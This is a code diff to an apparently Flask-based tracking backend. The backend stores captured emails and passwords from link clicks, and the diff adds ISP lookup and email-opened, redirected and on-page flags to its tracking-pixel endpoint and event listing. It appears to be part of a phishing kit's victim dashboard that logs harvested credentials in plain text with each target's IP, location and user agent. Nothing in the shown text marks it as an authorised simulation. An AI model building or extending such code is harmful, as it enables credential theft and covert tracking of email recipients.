@@ -29,10 +29,14 @@ def get_events():
             te.user_agent,
             te.country,
             te.city,
+            te.isp,
             te.captured_email,
             te.captured_password,
             te.status,
             te.blocked_reason,
+            te.email_opened,
+            te.redirected,
+            te.on_page,
             l.short_code as tracking_id
         FROM tracking_events te
         JOIN links l ON te.link_id = l.id
@@ -53,10 +57,14 @@ def get_events():
                 'user_agent': event['user_agent'],
                 'country': event['country'] or 'Unknown',
                 'city': event['city'] or 'Unknown',
+                'isp': event['isp'] or 'Unknown',
                 'captured_email': event['captured_email'],
                 'captured_password': event['captured_password'],
                 'status': event['status'] or 'processed',
-                'blocked_reason': event['blocked_reason']
+                'blocked_reason': event['blocked_reason'],
+                'email_opened': bool(event['email_opened']),
+                'redirected': bool(event['redirected']),
+                'on_page': bool(event['on_page'])
             })
         
         conn.close()
@@ -87,20 +95,26 @@ def pixel_tracking(link_id):
             return '', 404
         
         # Get request details
-        ip_address = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
-        user_agent = request.headers.get('User-Agent', '')
-        uid = request.args.get('uid', '')  # Unique identifier parameter
+        ip_address = request.environ.get("HTTP_X_FORWARDED_FOR", request.remote_addr)
+        user_agent = request.headers.get("User-Agent", "")
+        uid = request.args.get("uid", "")  # Unique identifier parameter
         
-        # Simple geolocation (you might want to use a proper service)
-        country = 'Unknown'
-        city = 'Unknown'
+        # Simulate geolocation and ISP lookup (replace with actual API calls in production)
+        country = "Unknown"
+        city = "Unknown"
+        isp = "Unknown"
+        
+        # Determine status based on endpoint (for now, assume pixel hit means email opened)
+        email_opened = True
+        redirected = False  # This will be set to True when the user is redirected to the target URL
+        on_page = False     # This would require a separate signal from the landing page
         
         # Insert tracking event
-        conn.execute('''
+        conn.execute("""
             INSERT INTO tracking_events 
-            (link_id, ip_address, user_agent, country, city, timestamp, status, unique_id)
-            VALUES (?, ?, ?, ?, ?, datetime('now'), 'processed', ?)
-        ''', (link['id'], ip_address, user_agent, country, city, uid))
+            (link_id, ip_address, user_agent, country, city, isp, timestamp, status, unique_id, email_opened, redirected, on_page)
+            VALUES (?, ?, ?, ?, ?, ?, datetime("now"), "processed", ?, ?, ?, ?)
+        """, (link["id"], ip_address, user_agent, country, city, isp, uid, email_opened, redirected, on_page))
         
         # Update link statistics
         conn.execute('''
